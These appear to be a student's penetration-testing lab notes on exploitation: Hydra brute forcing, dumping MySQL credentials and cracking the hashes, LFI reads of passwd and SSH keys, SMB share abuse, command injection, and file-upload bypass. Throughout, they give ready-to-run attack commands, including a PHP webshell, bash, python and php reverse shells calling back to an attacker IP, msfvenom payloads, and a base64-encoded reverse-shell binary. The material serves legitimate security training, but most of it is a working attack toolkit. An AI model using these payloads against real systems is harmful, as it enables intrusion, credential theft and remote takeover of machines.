## Vulnerability Exploitation

- exploitation code + payload that I want(Shell, extract info, execution)
    - PoC : proof not attack , just minimum one


### account based
- Brute force or dictionary attack 
- password spraying - [many users:one] 
- default creds



#### Hydra
```
SSH
hydra -L USERFILE -P PASSLIST ssh://172.31.181.133 -V -s 22 : verbose

FTP
hydra -L userfile -P password ftp://IP -V -s 21 : anonymous check

http(default)
hydra -L foundusers.txt -p password 172.31.176.64 -s 8081 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^:Invalid" -V: username > passwd can , if it shows, fails, let it go

    -> validusers 
hydra -L validusers.txt -P pass.txt 172.31.176.64 -s 8081 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^:incorrect" -V


hydra -l admin -P words.txt http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^:F=incorrect" -s 80 -V -f
  - -f exit when pair is found 
```

- if wordpress, automatically find username fast

```
wpscan --url http://172.31.176.64 --passwords pass.txt
```

- password spraying 
```
hydra -L commonusername.txt -p 'pas@' ssh://~
```

- credential stuffing
    - pastebin : exposed in darkweb before, username, pwd 

    - Version, Name > default credentials search 
        - DVMA v2.3.3


### MySQL dumping
```bash
mysqldump -u root -p'' -P PORT -h IP DB TABLE
    : -p'' importatnt
mysqldump -u root -p'' -P PORT -h IP DB TABLE --where="username LIKE '%admin%'"


mysqldump -u root -p'root' -P 33060 -h 172.31.176.64 production > production.sql.dump
mysqldump -u root -p'root' -P 33060 -h 172.31.176.64 production users --where="username LIKE '%admin%'"> users.sql.dump 
```

#### parsing 
```bash
mysqldump -u root -p'root' -P 33060 -h 172.31.176.64 production users > users.sql.dump 

cat users.sql.dump | grep -i 'insert into' -A 26 | tr -d "'" | cut -d ',' -f 3 | tr -d ')' | tr -d ';' | tail -n 5 > mysql.hash
```

#### hash cracking

```
identifier >
john --wordlist=/usr/share/wordlists/rockyou.txt mysql.hash
```

- they guess hash type - I think LM hash, but it's possible md5,...,etc.
    - Raw-MD5
```
john --wordlist=/usr/share/wordlists/rockyou.txt mysql.hash --format=Raw-MD5

john --wordlist=/usr/share/wordlists/rockyou.txt mysql.hash --format=Raw-MD5 --pot=john.output
: output file clear
```

- John = a lot of cracking
    - /etc/passwd, /etc/shadow, unshadow > OS cracking
    - ssh2john : SSH private key(id_rsa) encrypted  by passphrase
    - zip2john : encrypted zip
    - MS office 
    - etc.

- alternative : hashcat




### Payload 
- What attck you want?

- type
    - bindshell : execute > 7777port listen binded (but server limited opened ports, 80 443 only)
    - revshell : execute > to attacker myself (you can connect whatever ports, firewall outbound not blocked )
    - webshell : execute commands via web, simple or complex

- type2
    - Staged: small > download payload more 
    - Stageless : needed payload all included

- depends on OS
    - linux ELF
    - web php, jsp
    - windows powershell,...


- Reverse shell cheatsheet.md : really simple online - github 
- revshells.com : generator 
- msfvenom
```
msfvenom --list payload
msfvenom -p PYLOAD --list-options
msfvenom -p PYLOAD --list formats
msfvenom -p linux/x64/shell_reverse_tcp LHOST= LPORT= -f elf -o reverse.elf
```

#### webshell
- php shell
```php
<?php echo shell_exec($_GET['cmd']); ?>
```
```
scp webshell.php root@172.31.176.64:/var/www/html/webshell.php
```

- in practice, don't upload this kind of webshell, malicious file left

- password or secured way 
    - wso-webshell > github > copy all Raw or wget RAW(wso.php) > make own password rather than default password 
    - echo -n ' ' | md5sum

    - random file name 
        - e.g. alkdfjlsadfjasd.php

- but still dangerous to upload 

- seems normal traffic > but request(get), respond suspicious > at advanced level, encoding or encrypt,decrypt



#### bind shell
- bindshell : listening open myself
```
msfvenom -p linux/x64/shell_bind_tcp RHOST=172.31.176.64 LPORT=7777 -f elf -o 
: stageless 

scp bindshell root@172.31.176.64:/tmp/bindshell

nc 172.31.176.64 7777

```

- reverseshell github or revshells.com : generator
    - nc php perl bash 


- nc bindshell execute code on the target host
```
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc -l 0.0.0.0 9001 > /tmp/f
```
- nmap > bindshell disconnected, 
- don't need to make a file(msfvenom)


#### reverse shell
```
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.8.0.129 LPORT=6464 -f elf -o revshell
scp revshell root@172.31.176.64:/tmp/revshell

nc -nvlp 6464
```

- better bash cmd, rather than fileupload
```
sh -i >& /dev/tcp/10.8.0.129/6464 0>&1

python or python3
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.8.0.129",6464));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'
```

- check if it exists
    - php --version
    - python3 --version
    - bash


### FTP
- upload path
- which network access file and execute?
    - e.g. webserver > ftp can access /upload dir ,and execute (upload payload)

- webshell bothering URL encoding etc.> just directly php reverse shell
- Tech: linux apache, php 

- php-reverse-shell.php : more stable
    - /usr/share/webshells/php/


### LFI 
- file read important
    - ssh, zsh_ history , db , user info, network configuration!


- ?page=/etc/passwd
- less 1000 : services /nologin
- more 1000 : user /bin/bash shell

- cat .zsh_history : all I've used , but no priv to read

- history

- usernames > /home/groot/.ssh/id_rsa : SSH private key  > access as a groot even though I don't know the password

```
vim groot-privatekey.pem
chmod 600 groot-privatekey.pem
ssh -i groot-privatekey.pem groot@172.31.176.64
```

- MySQL server > conf file read 
    - cd /etc/mysql/my.cnf 
    - : default, rarely creds #, misconfiguration, versions, what port running

- wordpress conf
    - /var/www/html/wp-config.php
    - /var/www/html/wordpress/wp-config.php




- asessment

smbmap
```
smbmap -H 172.31.176.64
```
netexec
```
netexec smb 172.31.176.64 -u '' -p ''
netexec smb 172.31.176.64 -u '' -p '' --shares
```
enum4linux  



- smbclient
    - smb read/write >>>>  put and execute reverseshell
```
smbclient \\\\172.31.176.64\\samba-share 
or
smbclient \\\\172.31.176.64\\samba-share -U ""
```


- but actual path is different, mappnig
    - /var/smb/smbshare-wow
- but conf file read
    - /etc/samba/smb.conf
    ```    
    [samba-share]
    path =/samba
    read only = no : writable
    ```
> /samba/php-reverse-shell.php
```
python -c 'import pty; pty.spawn("/bin/bash")'
python3 -c 'import pty; pty.spawn("/bin/bash")'

stty raw -echo; fg
reset 

export SHELL=bash
export TERM=xterm-256color
```

### HTTP Command injection 
- code based revshelld 
- if there's interpreter or commands exist check > execution 
- error message stdout 
    - 2>&1

- PHP python check: php -h 
    - `127.0.0.1;php -h`
    - URL encoding needed in burp suite.
    - `curl -h` 

- revshells.com list > php shell_exec
```bash
php -r '$sock=fsockopen("10.8.0.129",9001);shell_exec("sh <&3 >&3 2>&3");'
```

- ubuntu using > maybe python
- no response = maybe error message on the target host
    - python -h 2>&1 : I can see 'not found'



### HTTP file uplaod bypass
- wso.php

1. extension : .png content-type : php 
2. extension : .php content-type : png
3. extension : .png content-type : png , but magic bytes: png, file-content : php > execute payload code(webshell) with LFI 


- ../../hackable/uploads/magic.png

- webshell broken in browser. > better to use rev-shell


### known exploit
- meomry(stack/heap) overflow = BSOD(blue screen) be careful 
- remote = initial exploit, local = post exploit
- authenticated Vs Unauthenticated need or not

- analyze 
- read annotation # > 
    - structure check. where main func, exploit, utility 


- if there're no exploit code on searchsploit, need to find on the internet

```
searchsploit vsftpd 
backdoor command execution 

> google : vsftpd 2.3.4 "analysis" github
```

- got even source code, but some cases, can't see the source code


```
serachsploit vsftpd 2.3.4
serachsploit -w ID 
serachsploit -m ID : mirror 
or 
serachsploit -p ID  > cp PATH . (if there's in kali)

python3 vsftpd_234_exploit.py <IP address> <port> <command>
python3 vsftpd_234_exploit.py 172.31.226.109 2100 whoami



gcc x 
almost only bash exist 
sh -i >& /dev/tcp/10.8.0.129/9002 0>&1

if there's no way, 
base64 encoding 
base64 -w 0 : disable line wrap 

msfvenom file create > cat PAYLAOD | base64 -w 0
just send text > create file on the target host while decoding base64 -d , chmod +x , execute  

echo 'BASE64' | base64 -d > revshell; chmod +x revshell; ./revshell


why don't you just create file on the target directly 
or
wget ? X 
can't send the file online 
curl wget msfvenom X 

msfvenom create 
> base64 encoding 
> echo 'ENCODING' | base64 -d > create file  (return to original revshell)
> chmod +x, execute.


msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.8.0.129 LPORT=9009 -f elf -o revshell : *** lhost = attacker's host

cat revshell | base64 -w 0


"echo 'f0VMRgIBAQAAAAAAAAAAAAIAPgABAAAAeABAAAAAAABAAAAAAAAAAAAAAAAAAAAAAAAAAEAAOAABAAAAAAAAAAEAAAAHAAAAAAAAAAAAAAAAAEAAAAAAAAAAQAAAAAAAwgAAAAAAAAAMAQAAAAAAAAAQAAAAAAAAailYmWoCX2oBXg8FSJdIuQIAIzEKCACBUUiJ5moQWmoqWA8FagNeSP/OaiFYDwV19mo7WJlIuy9iaW4vc2gAU0iJ51JXSInmDwU=' | base64 -d > revshell2; chmod +x revshell2;./revshell2"

```

### shell upgrade

- dump shell > Fully interactive TTY shell
    - when SSH is impossible, very important 

- all inputs from Kali > send to host
    - = same with target host 

```
ssh groot@172.31.152.242

sh -i >& /dev/tcp/10.8.0.129/9001 0>&1

python3 -c 'import pty;pty.spawn("/bin/bash")' : pty shell
ctrl+Z : process background
-
stty raw -echo;fg
reset 
- host
export SHELL=bash : what shell I'm using is bash
export TERM=xterm-256color : what terminal I'm using is xterm-256color for color 
```

